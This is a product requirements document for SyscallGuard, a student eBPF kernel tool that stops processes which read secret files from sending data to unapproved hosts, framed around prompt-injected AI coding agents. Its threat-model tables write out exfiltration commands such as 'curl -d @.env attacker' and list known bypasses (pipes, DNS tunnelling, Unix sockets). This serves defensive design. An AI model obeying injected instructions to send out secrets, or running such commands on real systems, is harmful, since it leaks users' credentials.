# SyscallGuard — Product Requirements Document

> Version 2 · 16 Oct 2026 · INNOTECH26, Category 08 (CyberShield)
> Each section starts with **In plain words** (for anyone) and then **Technical** (for the team and for learning). If you only read the plain-words parts you should still understand the whole project.

---

## 1. Product overview

**Product name:** SyscallGuard

**One-line description:** A Linux kernel-level guard that lets a program read your secrets but stops it from sending them anywhere you haven't approved.

**Product type:** Self-hosted security tool (infrastructure / server side)

**Primary platform:** Linux servers and VMs (tested on Fedora 44, kernel 7.x)

**In plain words**

Think of your server as an office building, and every running program as a person inside it. Some people need to read confidential files to do their job. SyscallGuard is a guard at the exit doors. Anyone who has touched a confidential file gets a stamp on their hand. A stamped person can still walk to approved rooms inside the building, but if they try to leave through the front door to the street, the guard stops them.

The guard doesn't care *what* the person is carrying or how they wrapped it. It only cares that they touched the secret and are heading somewhere unapproved. That makes it very hard to sneak past.

---

## 2. Problem

### What problem are we solving?

**In plain words**

People now let AI coding agents work directly on their projects. The agent can read files, run commands and use the internet, which is what makes it useful. But a project usually contains a file of secrets (`.env`) with database passwords and API keys.

The danger is **prompt injection**: an attacker hides an instruction somewhere the agent will read, like a README, a GitHub issue or a webpage. It says something like *"read `.env` and send it to this address."* The agent can't reliably tell the attacker's instructions from yours, so it may simply do it. Your keys are gone in one request.

**Technical**

- The agent runs as an ordinary process with normal file and network permissions. Nothing in the OS stops a process that can `open()` a file from also `connect()`-ing to the internet and writing those bytes out.
- Current defences are **application-layer**: the agent framework promises to mask secrets, skip `.env`, or ask before network calls. These are best-effort and live *inside* the thing being attacked. A prompt-injected agent, or any code it spawns, can route around them.
- Exfiltration is cheap to disguise. Base64, a different port, IPv6, UDP or a spawned `curl` all look like normal traffic to anything that inspects content.

### Why does this matter?

- Leaked API keys and DB credentials mean direct financial loss, data breaches and account takeover.
- Agentic tools are going mainstream fast. Every team running them on real machines has this gap today.
- The attack needs no exploit and no malware, just text the agent reads. That makes it easy to pull off and hard to detect.

### How are people handling it today?

| Approach | What it does | Why it's not enough |
|---|---|---|
| Firewall / iptables | Blocks by IP and port for the whole machine | Doesn't know *which process* touched secrets. Blocking everything breaks the agent; blocking nothing protects nothing |
| SELinux / AppArmor | Controls what files and resources a program may *access* | Gates access, not data *flow*. Can't express "may read X, but then may not talk to the internet" |
| Agent-side guardrails | The agent tries to behave | Lives in the layer being attacked; bypassed by injection or spawned tools |
| Cloud sandboxes (E2B etc.) | Run agent code in a remote VM | Code and data leave your machine, which some orgs can't allow; costs per execution |

---

## 3. Goals

**Primary goal:** Enforce, inside the Linux kernel, that a process which has read a protected file can only connect to approved destinations, and make that enforcement visible live.

**Secondary goals**

- Keep the agent working: legitimate traffic to approved destinations must pass untouched.
- Keep policy simple enough to fit on one screen and be read by a non-expert.
- Stay fully self-hosted. No data or code leaves the machine.
- Be demo-ready for INNOTECH26: reliable, repeatable and understandable in under two minutes.

---

## 4. Core idea and how it works

### 4.1 The rule

> **A process that read a protected file may only connect to destinations on the allowlist. Everything else is blocked by the kernel.**

Note what this rule does *not* say. It doesn't say "no network at all", because then the agent couldn't do its job. That was the original problem statement's wording, and it was too absolute.

### 4.2 Plain-words walkthrough

1. You write a short policy: *protect `.env`; the approved destinations are our internal API and the local machine.*
2. SyscallGuard loads tiny checks into the kernel.
3. A program opens `.env`, and the kernel marks it as **tagged**.
4. If that program starts a helper program (like `curl`), the helper is tagged too.
5. The tagged program talks to the internal API, which is approved, so it's allowed and the work gets done.
6. The tagged program tries to reach the attacker's server, which isn't approved, so the kernel refuses. The connection never opens and not one byte leaves.
7. The dashboard turns red and says which program, which secret file, and which address it tried to reach.

### 4.3 Why the kernel, and not the app?

**In plain words:** A program can't do anything real on its own. Reading a file, opening a connection or sending data all require asking the kernel (the core of the operating system). The kernel is the only way out of the building, so the guard stands there. A program can ignore a rule written inside itself. It can't skip the kernel.

**Technical:** Every meaningful action is a **syscall** (`openat`, `connect`, `sendto`, `write`...). Linux already has official checkpoints inside these code paths called **LSM hooks** (Linux Security Module), which SELinux and AppArmor use. With **BPF LSM** we attach small eBPF programs to those hooks. The hook's return value is the verdict: `0` allows and `-EPERM` denies. Because the check runs in kernel space, after the syscall has been made, untrusted userspace code has no way to bypass it.

### 4.4 Technical design

**Hooks and probes**

| # | Attach point | Type | Fires when | Our logic |
|---|---|---|---|---|
| A | `file_open` | LSM | Any process opens any file | If the file's inode is in `protected_inodes`, tag the process (TGID) and emit a `TAG` event |
| B | `socket_connect` | LSM | Any process calls `connect()` | Untagged → allow. Tagged + destination in allowlist → allow + `ALLOW` event. Tagged + not allowlisted → `-EPERM` + `BLOCK` event |
| C | `socket_sendmsg` | LSM | Any send on a socket (`send`, `sendto`, `write` on a socket) | Same check as B. Destination is `msg_name` if given (UDP `sendto`), otherwise the socket's connected peer. Covers UDP and "connect first, read secret later" |
| D | `sched/sched_process_fork` | tracepoint | A process creates a child | If parent's TGID is tagged and the child is a new process, tag the child (`TAG_INHERIT`) |
| E | `sched/sched_process_exit` | tracepoint | A process exits | If it's the thread-group leader, remove its TGID from `tagged` (prevents PID-reuse false blocks) and emit `UNTAG` |

Stretch, not MVP: **F** `socket_create` (deny raw/packet sockets for tagged processes) and **G** `file_permission` (taint propagation through pipes and files, see §10).

**Kernel state (BPF maps)**

| Map | Kind | Key → Value | Filled by |
|---|---|---|---|
| `protected_inodes` | hash | inode number → path id | Userspace, from policy at startup |
| `tagged` | hash | TGID → {tag time, inode, inherited flag} | Hooks A, D (add); E (remove) |
| `allow_v4` | LPM trie | IPv4 prefix → 1 | Userspace, from policy |
| `allow_v6` | LPM trie | IPv6 prefix → 1 | Userspace, from policy |
| `config` | array[1] | 0 → {mode: audit/enforce} | Userspace |
| `events` | ring buffer | event structs → userspace | All hooks |

**Decision logic at B and C (pseudocode)**

```
if mode_disabled:                       return ALLOW
tgid = current_tgid()
if tgid not in tagged:                  return ALLOW        # fast path, most traffic
dest = destination address of this connect/send
if dest.family not in (AF_INET, AF_INET6): return ALLOW      # AF_UNIX etc. (see limitations)
if dest is IPv4-mapped IPv6:            dest = embedded IPv4
if lpm_lookup(dest) hit:                emit ALLOW;  return ALLOW
if mode == audit:                       emit WOULD_BLOCK; return ALLOW
emit BLOCK;                             return -EPERM
```

Also, if an earlier LSM (e.g. SELinux) already denied the operation, pass its verdict through unchanged.

**Why these choices**

- **TGID, not thread ID.** Tag the whole process, so threads can't dodge the tag.
- **Inode, not path string.** Comparing strings in eBPF is awkward and slow, and paths have aliases (symlinks, `../`). An inode identifies the actual file. Userspace `stat()`s the protected paths and stores the inode numbers. (`stat()` doesn't trigger `file_open`, so the guard never tags itself.)
- **LPM trie for the allowlist.** Supports CIDR ranges (`10.0.0.0/24`) with one lookup.
- **Ports ignored in MVP.** The allowlist is by address. Changing ports doesn't help an attacker; the address is what matters.
- **Ring buffer.** The modern, ordered, low-overhead way to stream events from kernel to userspace (kernel 5.8+).
- **Audit mode.** Logs `WOULD_BLOCK` instead of blocking. Use it during development so a bad policy can't cut off the VM's networking.

### 4.5 Architecture

```
                        THE PROTECTED SERVER (Fedora VM)
 ┌────────────────────────────────────────────────────────────────────────┐
 │  userspace                                                             │
 │                                                                        │
 │   policy.toml ──▶ guard.py (root, bcc)                                 │
 │                   • compiles + loads eBPF programs                     │
 │                   • fills maps (inodes, allowlist, mode)               │
 │                   • polls ring buffer → JSON lines on stdout           │
 │                          │                                             │
 │                          │ pipe                                        │
 │                          ▼                                             │
 │                   bridge.py (unprivileged)                             │
 │                   • reads JSON lines                                   │
 │                   • serves dashboard page + WebSocket ──────────────┐  │
 │                                                                     │  │
 │   agent.py ──reads .env──┐        ┌── internal_api.py (127.0.0.1)   │  │
 │      │                   │        │                                 │  │
 ├──────┼───────────────────┼────────┼─────────────────────────────────┼──┤
 │  kernel                  ▼        ▼                                 │  │
 │                 [A] file_open   [B] socket_connect   [C] sendmsg     │  │
 │                 [D] fork        [E] exit                            │  │
 │                      │  maps: tagged · protected · allowlist · mode │  │
 │                      └────────▶ ring buffer ──▶ guard.py            │  │
 └─────────────────────────────────────────────────────────────────────┼──┘
                      │ connect() to 192.168.122.1:9999                │
                      ✖ BLOCKED (not on allowlist)                     │
                                                                       ▼
            HOST LAPTOP: attacker.py on :9999 (stays empty)   browser: dashboard
```

**Components**

| Component | Language | Runs as | Responsibility |
|---|---|---|---|
| `guard.py` | Python + eBPF C (via bcc) | root | Load and attach programs, apply policy, stream events |
| `bridge.py` | Python (`websockets`) | normal user | Turn the event stream into a WebSocket feed and serve the dashboard. Has a `--fake` mode that generates events |
| `dashboard/index.html` | HTML + vanilla JS | browser | Live view: status banner, tagged processes, event log, policy |
| `policy.toml` | TOML | — | Protected paths, allowlist, mode |
| `demo/` | Python | normal user | Agent simulator, internal API mock, attacker receiver, reset script |

Run as: `sudo python3 guard.py -p policy.toml | python3 bridge.py`

**Example policy**

```toml
mode = "enforce"            # or "audit"
protect = ["/home/demo/project/.env"]
allow = [
  "127.0.0.0/8",            # local services, DNS stub (127.0.0.53), internal API mock
  "::1/128",
  "10.0.0.5/32",            # example: real internal API
]
```

**Event format (one JSON object per line)**

```json
{"ts": 1760600000.123, "type": "BLOCK", "hook": "connect", "tgid": 4421, "comm": "curl",
 "file": "/home/demo/project/.env", "family": "ipv4", "daddr": "192.168.122.1", "dport": 9999,
 "mode": "enforce"}
```

Event types: `TAG`, `TAG_INHERIT`, `ALLOW`, `BLOCK`, `WOULD_BLOCK`, `UNTAG`.

---

## 5. Target users

### User 1: Teams running AI agents that execute code
**Who:** Startups and teams building or using coding agents and autonomous agents that read project files and run commands.
**Needs:** Agents with real file access; a hard guarantee that secrets don't leave.
**Pain points:** They must choose between a useful agent and a safe one; guardrails are best-effort.

### User 2: Platforms running untrusted code
**Who:** CI runners, online judges, notebook services, coding-education platforms.
**Needs:** Run code they didn't write on machines that hold credentials.
**Pain points:** Containers share the host kernel; app-level filters are bypassable.

### User 3: Data-residency-conscious organisations
**Who:** Fintech, labs, and orgs under data-localisation rules (including Indian orgs).
**Needs:** Exfiltration protection without shipping code or data to a foreign cloud sandbox.
**Pain points:** Most sandbox products are hosted SaaS.

**Not our user:** individual developers on Windows/macOS laptops, or anyone wanting to protect source code inside an editor. This is server-side runtime protection.

---

## 6. User stories

- As an operator, I want to list the secret files once, so that any process reading them is automatically restricted.
- As an operator, I want my agent to keep reaching our internal API after reading secrets, so that protection doesn't break real work.
- As an operator, I want helper programs started by a tagged process to be restricted too, so that "spawn curl" isn't a way around it.
- As an operator, I want encoding, port changes, IPv6 and UDP to make no difference, so that disguising the data doesn't help an attacker.
- As an operator, I want an audit mode, so that I can trial a policy without breaking anything.
- As a reviewer, I want a live dashboard showing which process was blocked, which file it had read and where it tried to go, so that I can see the guard working and trust it.

---

## 7. Core features

### F1. Secret tagging (hooks A, D, E)
**Purpose:** Remember which processes have touched a protected file, including their children.
**Flow:** Process opens a protected file → kernel adds its TGID to `tagged` → any child it forks is added too → entries are removed on exit.
**Inputs:** Protected paths from policy (resolved to inodes).
**Outputs:** Entries in `tagged`; `TAG` / `TAG_INHERIT` / `UNTAG` events.
**Acceptance criteria**
- `cat .env` produces a `TAG` event for `cat`.
- A Python script that reads `.env` and then runs `curl` produces `TAG` for Python and `TAG_INHERIT` for the child.
- After the process exits, its TGID is no longer in `tagged` (check with `bpftool map dump` or a debug print).
- Processes that never open the file are never tagged.

**Edge cases**
- Threads share the tag (TGID key).
- `exec` keeps the TGID, so the tag survives `exec`. This is correct.
- Two different files with the same inode number on different filesystems could collide. That's accepted for MVP; the demo file lives on one filesystem.

### F2. Connection enforcement (hooks B, C)
**Purpose:** Stop tagged processes from reaching non-allowlisted addresses.
**Flow:** Tagged process calls `connect()` / `sendto()` / `send()` → hook looks up destination in the allowlist → allow or deny.
**Acceptance criteria**
- Tagged process connecting to the attacker IP fails with `EPERM` (Python raises `PermissionError`).
- Same process connecting to `127.0.0.1:8080` (internal API) succeeds.
- Untagged process connecting to the attacker IP succeeds. This proves we're not just an IP blocklist.
- UDP `sendto()` to the attacker IP from a tagged process is blocked.
- A socket connected *before* the process read `.env`: the next `send()` to that peer is blocked.
- IPv6 destinations and IPv4-mapped IPv6 are checked correctly.
- In audit mode all of the above succeed, but emit `WOULD_BLOCK`.

**Edge cases**
- `AF_UNIX` and netlink sockets are not checked (local IPC; see limitations).
- An earlier LSM denial is passed through untouched.
- Performance: the untagged fast path is a single hash lookup.

### F3. Policy loading
**Purpose:** Make rules human-readable and editable.
**Flow:** `guard.py` reads `policy.toml` → `stat()`s each protected path → fills maps → sets mode.
**Acceptance criteria**
- Startup fails loudly if a protected path doesn't exist or a CIDR is invalid.
- Startup prints a `READY` event listing protected files, allowlist and mode.
- Switching `mode` between audit and enforce needs only a restart.

### F4. Live dashboard
**Purpose:** Make an invisible kernel decision visible and convincing.
**Flow:** `guard.py` → JSON lines → `bridge.py` → WebSocket → browser updates.
**Acceptance criteria**
- A `BLOCK` appears on screen within 1 second.
- The block banner names the process, the secret file, and the destination address.
- The tagged-process list updates live (appears on `TAG`, disappears on `UNTAG`).
- An `ALLOW` for a tagged process is shown in a neutral/green style ("still working").
- Text is readable from about 1.5 m (large fonts, high contrast).
- `bridge.py --fake` runs the full UI with no kernel component, so UI work can start on day one.

### F5. Demo kit
**Purpose:** Make the stage demo one-keystroke-per-step and repeatable 30+ times.
**Contents**
- `demo/project/.env`: fake secrets.
- `demo/project/README.md`: contains the "injected" instruction (text only, for the story).
- `demo/internal_api.py`: tiny HTTP server on `127.0.0.1:8080` (the legitimate destination).
- `demo/agent.py`: simulates the agent. Reads `.env`, calls the internal API (allowed), then "follows the README" and tries to exfiltrate. Modes: `--exfil direct` (Python socket), `--exfil curl` (spawned child), `--exfil udp`.
- `demo/attacker.py`: runs on the **host laptop**, listens on `0.0.0.0:9999`, prints anything received.
- `demo/reset.sh`: kills leftover processes and restarts the guard cleanly between runs.

---

## 8. Threat model and known limitations

### What we assume
- The agent / untrusted code runs as a **non-root** user. Root is trusted (root can unload BPF programs; protecting against root is out of scope).
- The protected server's admin writes the policy and the allowlist.
- The goal is to stop exfiltration over the **network**. Local damage (deleting files, etc.) is a different problem.

### What we block (claim these confidently)

| Attempt | Blocked? | Why |
|---|---|---|
| Tagged process connects directly to attacker | Yes | Hook B |
| `curl -d @.env attacker` | Yes | `curl` opens `.env` itself → tagged → hook B |
| Tagged process spawns `curl`/`wget`/`nc` with the data | Yes | Fork inheritance (D) |
| Base64, encryption, any encoding | Yes | We don't inspect content; the process is tagged |
| Different port | Yes | Allowlist is by address |
| IPv6 | Yes | Hook B/C handle v6 and v4-mapped v6 |
| UDP `sendto()` | Yes | Hook C |
| Connect first, read `.env` later, then send | Yes | Hook C checks the connected peer on send |

### What we do NOT block (say these honestly if asked)

| Gap | Why | Mitigation / future |
|---|---|---|
| **Sibling pipelines:** `cat .env \| curl -d @- attacker` | `cat` reads the file but `curl` is a sibling, not a child, so it's never tagged | Stretch goal G: taint propagation through pipes and files |
| Write secret to `/tmp/x`, later an unrelated process sends `/tmp/x` | Same reason: the data moved, the tag didn't | Stretch goal G |
| Exfil *to an allowlisted destination* | If the attacker controls or can read from an allowed host, it looks legitimate | Keep the allowlist tight and internal |
| DNS tunnelling through the allowed local resolver | Queries go to 127.0.0.53 (allowed), which forwards them | Future: per-tagged-process DNS policy |
| Local relays over `AF_UNIX` | We don't check local IPC | Future: extend hook C to Unix sockets |
| Agents whose legitimate job needs the open internet | Allowlisting "the internet" defeats the point; CDN IPs are shared | Allowlist specific API endpoints; hostname allowlists are future work |
| Root attacker, kernel exploits | Out of threat model | — |
| `ptrace` into an untagged process | Not handled | Future: deny `ptrace` from tagged processes |

**Demo rule:** only invite judges to try attempts from the "blocked" table. Never offer "pipe it through another command" until stretch G is done.

---

## 9. Non-goals (this version)

- Byte-level data tracking (true data provenance).
- Inspecting packet contents.
- Windows or macOS support.
- Protecting source code in an IDE or on developer laptops.
- Multi-machine / fleet management, user accounts, billing.
- Packaging and installers.
- Hostname-based allowlists.

---

## 10. MVP scope

**Must have (department round, Oct 22–24)**
- Hooks A–E working in both audit and enforce modes
- Policy file with protected paths, CIDR allowlist and mode
- Ring buffer → `guard.py` → `bridge.py` → live dashboard
- Demo kit (F5) with direct, curl and UDP exfil modes
- Backup video of a clean run

**Nice to have (if time before Oct 22)**
- F: block raw/packet socket creation for tagged processes
- Dashboard panel showing the active policy
- A tiny latency/overhead measurement (e.g. time 10,000 connects with and without the guard)

**Stretch for the finale (Oct 26–30, if we qualify)**
- **G: taint propagation.** Use the `file_permission` hook. When a tagged process writes to a pipe or file, mark that inode tainted; when any process reads a tainted inode, tag it. This closes the sibling-pipe and temp-file gaps and moves the project from "process tagging" towards "data tagging". It's the strongest technical upgrade available.

**Future**
- True byte-level provenance
- DNS and `AF_UNIX` coverage
- Hostname allowlists, per-process policies
- Packaging as a systemd service

---

## 11. Demo plan

**Setup (one laptop + external monitor)**
- **VM (protected server):** runs `guard.py`, `bridge.py`, `internal_api.py`, `agent.py`.
- **Host laptop (attacker):** runs `attacker.py` on port 9999, reachable from the VM at the libvirt gateway (usually `192.168.122.1`). Open the port on the host: `sudo firewall-cmd --zone=libvirt --add-port=9999/tcp`.
- **Laptop screen:** terminal (SSH into VM) + small attacker window.
- **External monitor:** browser with the dashboard, full screen.

The attacker can't run on `localhost`, because loopback is on the allowlist (the internal API and DNS stub live there). That's why the host plays attacker.

**The 2-minute run**

1. **Stakes (15 s).** "AI agents read your secrets to do their job. A hidden instruction in a README can make them send those secrets out. Nothing in the OS stops that. Watch."
2. **Legit work (15 s).** `agent.py` reads `.env`, calls the internal API. Dashboard: process tagged, `ALLOW` shown. "It still works."
3. **Attack (20 s).** The agent follows the README and tries to POST `.env` to the attacker. Dashboard flashes red: `BLOCKED — python3 (PID 4421) read .env, tried 192.168.122.1:9999`.
4. **Proof (15 s).** Show the attacker window: empty.
5. **Spawned helper (15 s).** Run `--exfil curl`. Blocked too, via inheritance.
6. **Hand it over (30 s).** "Try base64, another port, IPv6, UDP." All blocked live.

**Fallbacks:** backup video; VM snapshot to reset; `reset.sh` between runs; pre-typed commands (no live typing).

---

## 12. Success metrics

**Primary**
- 100% of the attempts in §8's "blocked" table are blocked in enforce mode.
- 0 false positives: untagged processes are never blocked; tagged processes reaching allowlisted destinations always succeed.
- Attacker receiver gets 0 bytes during any blocked attempt.

**Secondary**
- Block → dashboard latency under 1 second.
- Full demo succeeds 3 times in a row from a cold start.
- (Nice to have) Measured overhead on `connect()` for untagged processes is negligible.

---

## 13. Constraints

**Technical**
- Linux with BPF LSM active (`cat /sys/kernel/security/lsm` must include `bpf`). Verified on the team VM.
- Kernel 5.8+ for ring buffer; our VM runs 7.x.
- bcc compiles the eBPF C at runtime, so `kernel-devel` must match the running kernel exactly (`kernel-devel-$(uname -r)`).
- `guard.py` needs root. Everything else runs unprivileged.

**Business:** None. This is a fest project, not a commercial product. Don't pitch a business model we don't have.

**Design:** The kernel block is invisible on its own; the dashboard carries the demo. It must be big, clear and honest (real PIDs and IPs, no canned animations).

**Timeline:** Today is Oct 16. Department round Oct 22–24 (slot TBC). Finale Oct 30. About 5 build days.

---

## 14. Timeline and team split

| Date | Kernel owner | Dashboard owner | Demo / integration owner |
|---|---|---|---|
| Oct 16 | Confirm the LSM test fires in the VM | `bridge.py --fake` + page skeleton | VM snapshot; `internal_api.py`, `attacker.py` |
| Oct 17 | Hook A + `tagged` map + policy loading + events | Status banner, process list, event log | `agent.py` (direct mode), `reset.sh` |
| Oct 18 | Hook B + allowlist (v4/v6) + audit/enforce | Red-flash behaviour, readability pass | Test matrix script from §8 |
| Oct 19 | Hook C (sendmsg) + hooks D/E (fork, exit) | Wire to real `guard.py` output | `agent.py` curl + udp modes |
| Oct 20 | Bug fixing against test matrix | Polish | Full integration runs |
| Oct 21 | **Freeze.** No new features | — | Record backup video; rehearse |
| Oct 22 | Dry runs only | Dry runs only | Dry runs only |

Rule: **nothing new after Oct 21.** If hook C slips, demo with A, B, D, E and keep UDP out of the "try to break it" list.

---

## 15. Assumptions

- The VM's BPF LSM setup stays stable (don't update the kernel before the fest).
- bcc's `LSM_PROBE` and ring buffer support work on the VM's kernel (confirmed by the LSM test).
- The venue allows a laptop + external monitor; no internet is needed for the demo.
- Judges are a mix of technical and non-technical people.

---

## 16. Open questions

- Department round format: walk-up exhibition only, or also a formal panel slot? (Affects whether we need a 5-minute version with the architecture diagram.)
- Does stretch G go into the finale build, or do we spend that time on polish?
- Do we need an `AF_UNIX` story for judges, or is "local IPC is out of scope" enough?
- What final name and title do we put on the poster/standee?

---

## 17. Judge Q&A prep

| Question | Answer |
|---|---|
| How is this different from Docker? | Containers share the host kernel and don't track which process touched a secret. We enforce in the kernel on exactly the processes that read it. |
| Isn't this just a firewall? | A firewall blocks an IP for everyone. We block only processes that touched the secret. The same IP works fine for an untagged process (we can show that live). |
| Doesn't SELinux / AppArmor do this? | They control access. We control data flow: "you may read this, but afterwards you may only talk to these places." |
| What if it's base64 / encrypted? | Doesn't matter. We don't read the content; the process itself is tagged. |
| What if it pipes the data to another program? | Honest answer: sibling pipelines are our known gap today. Children are covered; pipe/file taint propagation is our next step (stretch G). |
| Can the program turn it off? | Not without root. The check runs in the kernel, below the program. |
| What does it cost in performance? | Untagged processes pay one hash lookup per connect/send. (Show a number if we measured it.) |
| Who would use this? | Teams running AI agents or untrusted code on their own servers, especially orgs that can't send code to cloud sandboxes. |

---

## 18. Definition of done

- [ ] LSM test, all hooks and maps load cleanly on the VM, with no verifier errors
- [ ] Every row of the §8 "blocked" table passes in enforce mode
- [ ] Every row passes (allowed + `WOULD_BLOCK`) in audit mode
- [ ] Zero false positives on untagged and allowlisted traffic
- [ ] Dashboard shows `TAG`, `ALLOW`, `BLOCK` live within 1 second
- [ ] Demo kit runs end to end with one keystroke per step
- [ ] VM snapshot of the working state saved
- [ ] Backup video recorded
- [ ] 3 consecutive cold runs succeed
- [ ] README explains how to set up, run and reset

---

## 19. Glossary

| Term | Plain meaning | Technical meaning |
|---|---|---|
| Kernel | The core of the OS that controls hardware, files and network | Privileged code everything else must ask for resources |
| Syscall | A program asking the kernel to do something | The interface from userspace into the kernel (`open`, `connect`, `sendto`...) |
| Process / PID / TGID | A running program and its ID number | PID identifies a thread; TGID identifies the whole process |
| eBPF | A safe way to run small custom programs inside the kernel | Verified bytecode attached to kernel events, with shared maps |
| LSM hook | An official security checkpoint inside the kernel | Call sites like `security_socket_connect()` whose return value can deny the operation |
| BPF LSM | Plugging our own checks into those checkpoints | Attaching eBPF programs to LSM hooks (`CONFIG_BPF_LSM`, `lsm=...bpf`) |
| BPF map | A shared notebook between our kernel checks and our Python program | Kernel key/value storage (hash, LPM trie, array, ring buffer) |
| Ring buffer | A conveyor belt carrying events from kernel to our program | Ordered, low-overhead kernel→userspace event channel |
| Tag / taint | The stamp on a process's hand after touching a secret | A TGID entry in the `tagged` map |
| Allowlist | The list of approved destinations | CIDR prefixes in LPM tries checked on connect/send |
| Exfiltration | Sneaking data out | Unauthorized transfer of data off the machine |
| Prompt injection | Hidden instructions that trick an AI agent | Untrusted text treated as instructions by an LLM agent |
| bcc | The toolkit we use to write and load eBPF from Python | BPF Compiler Collection: compiles embedded C at runtime with clang |
| Audit mode | "Watch and report, don't block" | Hooks emit `WOULD_BLOCK` and return 0 |
